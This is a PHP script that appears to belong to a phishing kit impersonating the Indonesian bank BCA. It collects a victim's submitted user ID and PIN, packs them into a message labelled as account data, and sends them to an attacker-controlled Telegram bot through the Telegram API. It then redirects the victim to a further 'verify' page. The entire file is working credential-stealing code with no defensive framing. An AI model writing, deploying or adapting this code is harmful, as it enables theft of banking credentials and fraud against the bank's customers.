<?php
session_start();
include "../../telegram.php";

$userid = $_POST['userid'];
$pin = $_POST['pin'];
$_SESSION['userid'] = $userid;
$_SESSION['pin'] = $pin;

$message = "
( BCA | DATA |  ".$userid." )
-- DATA AKUN DISINI --

×> Nama Lengkap : ".$userid."
×> Pin : ".$pin."

";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=html&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location:./../verify.php');
?>
